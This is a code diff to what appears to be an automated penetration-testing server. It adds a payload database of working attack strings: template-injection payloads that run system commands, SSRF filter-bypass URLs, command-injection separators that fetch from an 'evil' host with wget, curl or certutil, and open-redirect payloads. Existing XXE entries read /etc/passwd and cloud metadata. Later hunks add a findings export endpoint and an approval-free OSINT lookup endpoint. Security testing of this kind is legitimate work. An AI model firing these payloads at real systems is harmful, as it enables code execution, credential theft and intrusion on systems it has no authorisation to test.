@@ -133,6 +133,31 @@ const PAYLOAD_DB = {
   xxe: {
     file_read: ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
     ssrf: ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>']
+  },
+  ssti_extra: {
+    freemarker: ['${7*7}', '${7*7}${7*7}', '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'],
+    velocity: ['#set($x=7*7)$x', '#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))$rt.getRuntime().exec("id")'],
+    handlebars: ['{{7*7}}', '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this}}{{/with}}{{/with}}{{/with}}'],
+    nunjucks: ['{{7*7}}', '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}'],
+    jade_pug: ['#{7*7}', '= 7*7', '!= 7*7']
+  },
+  ssrf_bypass: {
+    decimal: ['http://2130706433/', 'http://3232235777/', 'http://2852039166/'],
+    hex_octal: ['http://0x7f000001/', 'http://0177.0.0.1/', 'http://0x7f.0x0.0x0.0x1/'],
+    unicode: ['http://127.0.0.1%00/', 'http://①②⑦.⓪.⓪.①/', 'http://%31%32%37.0.0.1/'],
+    redirects: ['http://127.0.0.1.nip.io/', 'http://localtest.me/', 'http://127.0.0.1:80@evil.com/', 'http://evil.com#@127.0.0.1/'],
+    ipv6: ['http://[::ffff:127.0.0.1]/', 'http://[::1]:80/']
+  },
+  cmdi_extra: {
+    separators: ['%0a id', '%0d%0a id', '`id` #', '| id #', '; id #', '&& id #', '|| id #', '$(id)'],
+    unix_special: ["id${IFS}", "id%09", "wget%20http://evil/", "curl%20http://evil/", "|/bin/sh|", "|telnet 127.0.0.1 4444|"],
+    windows_special: ['&cmd /c whoami', '%26%26whoami', '|powershell -nop -c whoami', '&certutil -urlcache -split -f http://evil/x']
+  },
+  open_redirect: {
+    protocol_relative: ['//evil.com', '///evil.com', '////evil.com'],
+    scheme_abuse: ['https://evil.com', 'javascript:alert(1)', 'data:text/html,<script>alert(1)</script>'],
+    encoded: ['/%2f%2fevil.com', '/%5cevil.com', '/%09/evil.com', '/%0d%0aLocation:%20//evil.com'],
+    backslash: ['/\\evil.com', '/..//evil.com', '/%2e%2e%2f%2fevil.com']
   }
 };
 
@@ -5699,6 +5724,34 @@ app.get('/api/findings', (req: Request, res: Response) => {
   res.json(redactSecrets({ findings }));
 });
 
+// Findings export: CSV or raw JSON for reports / bug-bounty submissions.
+app.get('/api/findings/export', (req: Request, res: Response) => {
+  const missionId = typeof req.query.missionId === 'string' ? req.query.missionId : '';
+  const format = typeof req.query.format === 'string' ? req.query.format.toLowerCase() : 'csv';
+  const findings = [...findingsLedger.values()]
+    .filter(finding => !missionId || finding.missionId === missionId)
+    .sort((a, b) => b.updatedAt.localeCompare(a.updatedAt));
+  const clean = findings.map((f) => ({
+    id: f.id, title: f.title, severity: f.severity, status: f.status, family: f.family,
+    target: f.target, claim: f.claim, confidence: f.confidence, recommendedFix: f.recommendedFix,
+    createdAt: f.createdAt, updatedAt: f.updatedAt,
+  }));
+  if (format === 'json') {
+    res.setHeader('Content-Type', 'application/json');
+    res.json(redactSecrets({ findings: clean }));
+    return;
+  }
+  const esc = (v: unknown): string => {
+    const s = String(v ?? '');
+    return /[",\n]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
+  };
+  const header = ['id', 'title', 'severity', 'status', 'family', 'target', 'claim', 'confidence', 'recommendedFix', 'createdAt', 'updatedAt'];
+  const rows = clean.map((f) => header.map((h) => esc((f as unknown as Record<string, unknown>)[h])).join(','));
+  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
+  res.setHeader('Content-Disposition', `attachment; filename="findings-${new Date().toISOString().slice(0, 10)}.csv"`);
+  res.send([header.join(','), ...rows].join('\r\n'));
+});
+
 app.post('/api/findings', (req: Request, res: Response) => {
   const body = req.body as Record<string, unknown>;
   if (rejectDuplicateLedgerId(res, findingsLedger, body.id, 'Finding', '/api/findings')) return;
@@ -6241,8 +6294,38 @@ app.post('/api/tools/recon', async (req: Request, res: Response): Promise<void> 
   res.json({ success: true, target: targetHost, scan_type, approvalId: guard.approval?.id || null, results: { dns, ports } });
 });
 
-app.get('/api/tools', (_req: Request, res: Response) => {
-  res.json({
+// Passive OSINT quick-look (direction-picker cards): runs ONE read-only OSINT
+// tool (username_search / telegram_lookup / email_format / ip_info) directly.
+// These are passive lookups of public data — no target network action, no
+// approval needed (the same posture as the MCP security_recon surface).
+const OSINT_QUICK_TOOLS = new Set(['username_search', 'telegram_lookup', 'email_format', 'ip_info']);
+app.post('/api/osint/quick', async (req: Request, res: Response): Promise<void> => {
+  const body = req.body as Record<string, unknown>;
+  const toolName = String(body.tool || '').trim();
+  if (!OSINT_QUICK_TOOLS.has(toolName)) {
+    res.status(400).json({ error: `Unknown OSINT tool '${toolName}' (allowed: ${[...OSINT_QUICK_TOOLS].join(', ')})` });
+    return;
+  }
+  try {
+    const mod = await import('./arsenal/social-osint.js');
+    const tool = {
+      username_search: mod.usernameSearchTool,
+      telegram_lookup: mod.telegramLookupTool,
+      email_format: mod.emailFormatTool,
+      ip_info: mod.ipInfoTool,
+    }[toolName];
+    if (!tool) { res.status(400).json({ error: `Unknown OSINT tool '${toolName}'` }); return; }
+    const result = await tool.handler({
+      parameters: (body.parameters ?? {}) as Record<string, string | number | undefined>,
+      target: undefined as never,
+    });
+    res.json(redactSecrets({ success: true, tool: toolName, output: result.output, findings: result.findings ?? [] }));
+  } catch (e) {
+    res.status(500).json({ error: `osint quick-look failed: ${e instanceof Error ? e.message.slice(0, 200) : 'unknown'}` });
+  }
+});
+
+app.get('/api/tools', (_req: Request, res: Response) => {  res.json({
     success: true,
     tools: SAFE_COMMANDS,
     count: SAFE_COMMANDS.length,
